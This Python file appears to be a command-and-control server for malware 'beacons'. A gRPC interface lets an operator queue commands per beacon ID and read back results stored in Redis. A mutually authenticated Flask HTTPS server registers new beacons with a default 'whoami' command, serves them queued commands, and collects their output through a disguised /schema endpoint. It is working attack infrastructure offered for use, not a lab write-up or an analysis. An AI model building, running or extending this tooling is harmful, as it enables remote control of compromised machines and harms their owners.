import base64
import ssl

from flask import *
import re
import grpc
from concurrent import futures
import time
import protobuff_pb2_grpc as pb2_grpc
import protobuff_pb2 as pb2
import redis  # Make sure to install and start the redis server
import string

conn = redis.StrictRedis(host='localhost', port=6379, db=0)
app = Flask(__name__)


class UnaryService(pb2_grpc.UnaryServicer):
    def __init__(self, *args, **kwargs):
        pass

    def GetServerResponse(self, request, context):

        # We need an ID (ID for beacon) and message (What to tell the beacon)
        message = request.message
        ID = request.bID
        opt = request.opt
        if set(ID).difference(string.ascii_letters + string.digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            if opt == 'SC':
                # If option is to set command, then write it to the file
                with open(f"iso/{ID}.html", "w") as f: # We're keeping the html files in another folder, e z clean up
                    f.write(message)
                result = f'Received command, wrote {message} to file {ID}'
                result = {'message': result, 'received': True}
                return pb2.MessageResponse(**result)
            elif opt == 'GR':
                # If option is to get the returned results of a beacon, page the Redis DB for the results
                res = conn.hget('beacons', f'{ID}')
                res = str(res)
                result = f'Getting status of beacon {ID}: {res}'
                result = {'message': result, 'received': True}
                return pb2.MessageResponse(**result)


@app.route("/")
def home():
    # Grab the appsessionid value from the headers
    val = request.headers['APPSESSIONID']
    if set(val).difference(string.ascii_letters + string.digits):
        # We're not going to bother with input sanitization here
        # If we receive special characters just drop it entirely
        pass
    else:
        message = "cmd;whoami;null "
        print(f'headers:{val}')
        # create a new page for the UUID we got from the headers
        with open(f"iso/{val}.html", "w") as f:
            f.write(message)
        return ('')


@app.route('/iso/<path:filename>', methods=['GET'])
def index(filename):
    # To do
    # Add a check for if beacon is still online
    # If beacon still sending data every x minutes, true, else mark it as dead
    if request.method == 'GET':
        bID = {request.headers['APPSESSIONID']}
        name = request.headers['RESPONSE']
        print(f'Host {bID} grabbed command')
        bID = str(bID)
        bID = re.sub('[^A-Za-z0-9]+', '', bID) # We are removing special characters
        with open(f'iso/{bID}.html') as f:
            content = f.readlines()
        for line in content:
            cmd = line
        conn.hset('beacons', f'{bID}', f'{cmd}') # Add the beacon ID and command to the redis DB
        conn.hset('beacons', f'{bID}', f'{name}')
        conn.hgetall('beacons')
        return send_from_directory('.', filename)
    return jsonify(request.data)


@app.route("/schema", methods=['POST'])
def results():
    if request.method == 'POST':
        bID = {request.headers['APPSESSIONID']}
        bID = str(bID)
        bID = re.sub('[^A-Za-z0-9]+', '', bID)
        total = f'Result: {request.data} from beacon: {bID}'
        response = request.data
        response = str(response)
        response = response.strip()
        print(response)
        conn.hset("beacons", bID, total)
        return 'HELO'


def serve():
    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
    pb2_grpc.add_UnaryServicer_to_server(UnaryService(), server)
    server.add_insecure_port('[::]:50051')
    server.start()
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_verify_locations('ca-crt.pem')
    context.load_cert_chain('server.crt', 'server.key')
    app.run('0.0.0.0', 8080, ssl_context=context)
    server.wait_for_termination()


if __name__ == "__main__":
    serve()